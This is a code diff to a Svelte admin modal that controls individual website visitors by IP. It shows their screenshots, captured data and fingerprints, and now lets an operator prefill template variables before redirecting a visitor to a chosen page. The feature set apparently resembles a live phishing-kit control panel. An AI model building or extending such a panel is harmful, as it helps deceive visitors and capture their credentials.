@@ -4,13 +4,20 @@
 	import { templates, getAllPages, getRouteForKey, type TemplateInput } from '$lib/templates';
 	import { previewUrl } from '$lib/visitorTemplates';
 	import type { Visitor, FlowStep } from '$lib/server/state';
+	import RedirectPageVarsForm from '$lib/components/RedirectPageVarsForm.svelte';
+	import {
+		initRedirectVarValues,
+		hasRedirectPageVars
+	} from '$lib/templates';
 
 	let { visitor, onclose }: { visitor: Visitor; onclose: () => void } = $props();
 
 	let activeTab = $state<'redirect' | 'page' | 'screenshot' | 'data' | 'fingerprint' | 'flow'>('redirect');
 
-	let selectedTemplate = $state(visitor.lastPage || '');
+	let selectedTemplate = $state(visitor.lastPageRoute || visitor.lastPage || '');
 	let inputValues = $state<Record<string, string>>({});
+	let redirectVarValues = $state<Record<string, string>>({});
+	let redirectVarTemplate = $state('');
 	let screenshotSrc = $state('');
 	let selectedFlow = $state('');
 
@@ -25,10 +32,29 @@
 		{ id: 'flow' as const, label: 'Flow', icon: GitGraph }
 	];
 
+	let pageTemplateKey = $derived(visitor.lastPageRoute || visitor.lastPage || '');
+
 	let currentInputs = $derived.by(() => {
-		if (!selectedTemplate) return [];
-		const route = getRouteForKey(selectedTemplate);
+		if (!pageTemplateKey) return [];
+		const route = getRouteForKey(pageTemplateKey);
 		return route?.inputs ?? [];
+	});
+
+	$effect(() => {
+		if (!pageTemplateKey) return;
+		inputValues = initRedirectVarValues(pageTemplateKey, visitor.inputs ?? {});
+	});
+
+	$effect(() => {
+		if (!selectedTemplate) {
+			redirectVarValues = {};
+			redirectVarTemplate = '';
+			return;
+		}
+		if (selectedTemplate !== redirectVarTemplate) {
+			redirectVarValues = initRedirectVarValues(selectedTemplate, visitor.inputs ?? {});
+			redirectVarTemplate = selectedTemplate;
+		}
 	});
 
 	let templatePreviewSrc = $derived.by(() => {
@@ -42,6 +68,9 @@
 
 	function redirectVisitor() {
 		if (!selectedTemplate) return;
+		if (hasRedirectPageVars(selectedTemplate) && Object.keys(redirectVarValues).length > 0) {
+			sendMessage('visitor:setinputs', { ip: visitor.ip, inputs: redirectVarValues });
+		}
 		sendMessage('visitor:redirect', { ip: visitor.ip, template: selectedTemplate });
 	}
 
@@ -140,6 +169,10 @@
 					</div>
 
 					{#if selectedTemplate}
+						<RedirectPageVarsForm template={selectedTemplate} bind:values={redirectVarValues} />
+					{/if}
+
+					{#if selectedTemplate}
 						<div class="rounded-lg border border-[var(--border)] bg-white overflow-hidden">
 							<div class="border-b border-[var(--border)] bg-[var(--input)]/40 px-4 py-2 text-[11px] font-mono text-[var(--muted-foreground)]">
 								Preview: {selectedTemplate}
@@ -165,7 +198,7 @@
 				<div class="space-y-5">
 					<div class="rounded-lg border border-[var(--border)] bg-[var(--accent)]/20 p-4">
 						<p class="text-sm font-semibold text-[var(--foreground)]">Current Page</p>
-						<p class="mt-1 text-xs text-[var(--muted-foreground)]">{visitor.lastPage || 'None assigned'}</p>
+						<p class="mt-1 text-xs text-[var(--muted-foreground)]">{visitor.lastPageRoute || visitor.lastPage || 'None assigned'}</p>
 					</div>
 
 					{#if currentInputs.length > 0}
